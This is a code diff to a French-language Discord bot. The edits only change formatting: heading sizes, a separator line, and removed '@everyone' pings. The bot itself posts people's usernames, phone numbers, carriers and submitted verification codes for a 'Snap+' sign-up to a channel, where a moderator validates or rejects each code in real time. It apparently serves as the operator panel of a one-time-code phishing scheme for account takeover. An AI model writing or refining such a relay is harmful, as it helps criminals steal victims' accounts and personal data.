@@ -3,8 +3,7 @@ const { users } = require('./store');
 
 const client = new Client({ intents: [GatewayIntentBits.Guilds] });
 
-// Ligne de séparation pour donner de la largeur
-const SEPARATOR = '──────────────────────────────────────────────';
+const SEPARATOR = '──────────────────────────────────────────────────────';
 
 client.once('ready', () => {
     console.log(`🤖 Bot Discord connecté : ${client.user.tag}`);
@@ -26,13 +25,12 @@ client.on('interactionCreate', async interaction => {
         const embed = new EmbedBuilder()
             .setColor('#2ecc71')
             .setDescription(
-                `@everyone\n` +
                 `# ✅ Code validé\n` +
                 `${SEPARATOR}\n` +
-                `## 👤 **Nom d'utilisateur:** ${username}\n` +
-                `## 📞 **Téléphone:** ${formatPhoneNumber(user.phone)}\n` +
-                `## 🔢 **Code:** \`${user.submittedCode}\`\n` +
-                `## 📅 **Validé à:** ${new Date().toLocaleString('fr-FR', { timeZone: 'Europe/Paris' })}\n` +
+                `### 👤 **Nom d'utilisateur:** ${username}\n` +
+                `### 📞 **Téléphone:** ${formatPhoneNumber(user.phone)}\n` +
+                `### 🔢 **Code:** \`${user.submittedCode}\`\n` +
+                `### 📅 **Validé à:** ${new Date().toLocaleString('fr-FR', { timeZone: 'Europe/Paris' })}\n` +
                 `${SEPARATOR}\n` +
                 `*Utilisateur vérifié*`
             );
@@ -52,13 +50,12 @@ client.on('interactionCreate', async interaction => {
         const embed = new EmbedBuilder()
             .setColor('#e74c3c')
             .setDescription(
-                `@everyone\n` +
                 `# 🔒 Code rejeté\n` +
                 `${SEPARATOR}\n` +
-                `## 👤 **Nom d'utilisateur:** ${username}\n` +
-                `## 🔢 **Code saisi:** \`${rejectedCode || 'N/A'}\`\n` +
-                `## 📞 **Téléphone:** ${formatPhoneNumber(user.phone)}\n` +
-                `## 📅 **Rejeté à:** ${new Date().toLocaleString('fr-FR', { timeZone: 'Europe/Paris' })}\n` +
+                `### 👤 **Nom d'utilisateur:** ${username}\n` +
+                `### 🔢 **Code saisi:** \`${rejectedCode || 'N/A'}\`\n` +
+                `### 📞 **Téléphone:** ${formatPhoneNumber(user.phone)}\n` +
+                `### 📅 **Rejeté à:** ${new Date().toLocaleString('fr-FR', { timeZone: 'Europe/Paris' })}\n` +
                 `${SEPARATOR}\n` +
                 `*L'utilisateur devra ressaisir le code*`
             );
@@ -83,13 +80,12 @@ async function sendInitialEmbed(username, phone) {
     const embed = new EmbedBuilder()
         .setColor('#2b2d31')
         .setDescription(
-            `@everyone\n` +
             `# 📱 Nouvelle inscription Snap+\n` +
             `${SEPARATOR}\n` +
-            `## 👤 **Nom d'utilisateur:** ${username}\n` +
-            `## 📞 **Téléphone:** ${formatPhoneNumber(phone)}\n` +
-            `## 🏛️ **Opérateur:** ${user.operator || 'N/A'}\n` +
-            `## ⏰ **Date:** ${new Date().toLocaleString('fr-FR', { timeZone: 'Europe/Paris' })}\n` +
+            `### 👤 **Nom d'utilisateur:** ${username}\n` +
+            `### 📞 **Téléphone:** ${formatPhoneNumber(phone)}\n` +
+            `### 🏛️ **Opérateur:** ${user.operator || 'N/A'}\n` +
+            `### ⏰ **Date:** ${new Date().toLocaleString('fr-FR', { timeZone: 'Europe/Paris' })}\n` +
             `${SEPARATOR}\n` +
             `*En attente du code...*`
         );
@@ -107,13 +103,12 @@ async function sendCodeEmbed(username) {
     const embed = new EmbedBuilder()
         .setColor('#f1c40f')
         .setDescription(
-            `@everyone\n` +
             `# 🔒 Code de vérification soumis\n` +
             `${SEPARATOR}\n` +
-            `## 👤 **Nom d'utilisateur:** ${username}\n` +
-            `## 🔢 **Code saisi:** \`${user.submittedCode}\`\n` +
-            `## 📞 **Téléphone:** ${formatPhoneNumber(user.phone)}\n` +
-            `## 📅 **Soumis à:** ${new Date().toLocaleString('fr-FR', { timeZone: 'Europe/Paris' })}\n` +
+            `### 👤 **Nom d'utilisateur:** ${username}\n` +
+            `### 🔢 **Code saisi:** \`${user.submittedCode}\`\n` +
+            `### 📞 **Téléphone:** ${formatPhoneNumber(user.phone)}\n` +
+            `### 📅 **Soumis à:** ${new Date().toLocaleString('fr-FR', { timeZone: 'Europe/Paris' })}\n` +
             `${SEPARATOR}\n` +
             `*En attente de validation par un modérateur*`
         );
